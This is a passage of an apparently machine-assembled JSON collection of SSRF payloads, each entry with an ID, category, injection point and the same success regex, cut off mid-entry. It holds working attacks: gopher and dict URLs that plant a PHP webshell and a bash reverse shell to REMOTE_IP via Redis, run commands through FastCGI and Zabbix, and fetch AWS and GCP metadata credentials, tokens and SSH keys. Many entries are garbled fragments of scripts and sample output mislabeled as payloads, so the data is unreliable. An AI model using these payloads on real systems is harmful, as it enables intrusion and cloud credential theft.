+    "payload_id": "OWP-242839",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += b\"\\x00\\xFC\"            # QTYPE AXFR (252)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242840",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request += b\"\\x00\\x01\"            # QCLASS IN (1)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242841",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dns_request = len(dns_request).to_bytes(2, byteorder=\"big\") + dns_request",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242842",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242843",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242844",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "python2.7 ./gopherus.py --exploit pymemcache",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242845",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "python2.7 ./gopherus.py --exploit rbmemcache",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242846",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "python2.7 ./gopherus.py --exploit phpmemcache",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242847",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "python2.7 ./gopherus.py --exploit dmpmemcache",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242848",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "MySQL",
+    "injection_point": "query_parameter",
+    "payload_string": "$ python2.7 ./gopherus.py --exploit mysql",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242849",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "MySQL",
+    "injection_point": "query_parameter",
+    "payload_string": "Give MySQL username: root",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242850",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Give query to execute: SELECT 123;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242851",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%32%33%3b%01%00%00%00%01",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242852",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CONFIG SET dir /var/www/html",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242853",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "CONFIG SET dbfilename file.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242854",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "SET mykey \"<?php system($_GET[0])?>\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242855",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "SAVE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242856",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242857",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242858",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dict://127.0.0.1:6379/SET%20mykey%20\"<\\x3Fphp system($_GET[0])\\x3F>\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242859",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "dict://127.0.0.1:6379/SAVE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242860",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242861",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242862",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242863",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://127.0.0.1:6379/_save",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242864",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$commands = array(",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242865",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'HELO victim.com',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242866",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'MAIL FROM: <admin@victim.com>',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242867",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'RCPT To: <User@[ATTACKER.DOMAIN.TLD]>',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242868",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'DATA',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242869",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'Subject: @hacker!',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242870",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'Hello Friend',",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242871",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "'.'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242872",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ");",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242873",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$payload = implode('%0A', $commands);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242874",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "header('Location: gopher://0:25/_'.$payload);",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242875",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242876",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242877",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"`",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242878",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://instance-data",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242879",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254.nip.io/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242880",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Static:http://nicob.net/redir6a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242881",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Dynamic:http://nicob.net/redir-http-169.254.169.254:80-",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242882",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://425.510.425.510 Dotted decimal with overflow",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242883",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://2852039166 Dotless decimal",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242884",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://7147006462 Dotless decimal with overflow",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242885",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242886",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0xA9FEA9FE Dotless hexadecimal",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242887",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0x41414141A9FEA9FE Dotless hexadecimal with overflow",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242888",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0251.0376.0251.0376 Dotted octal",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242889",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0251.00376.000251.0000376 Dotted octal with padding",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242890",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242891",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[::ffff:a9fe:a9fe] IPV6 Compressed",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242892",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242893",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242894",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://[fd00:ec2::254] IPV6",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242895",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/iam/security-credentials",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242896",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242897",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/user-data",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242898",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/reservation-id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242899",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/public-keys/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242900",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242901",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242902",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242903",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://localhost:9001/2018-06-01/runtime/invocation/next",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242904",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242905",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://169.254.169.254/computeMetadata/v1/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242906",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata/computeMetadata/v1/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242907",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242908",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242909",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242910",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1beta1/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242911",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242912",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242913",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242914",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242915",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"issued_to\": \"101302079XXXXX\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242916",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"audience\": \"10130207XXXXX\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242917",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"scope\": \"https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242918",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"expires_in\": 2443,",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242919",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"access_type\": \"offline\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242920",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "-H \"Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "ami-id|computeMetadata|meta-data|instance"
+    }
+  },
+  {
+    "payload_id": "OWP-242921",
+    "vulnerability_category": "Injection (SSRF)",
+    "target_technology": "Generic",
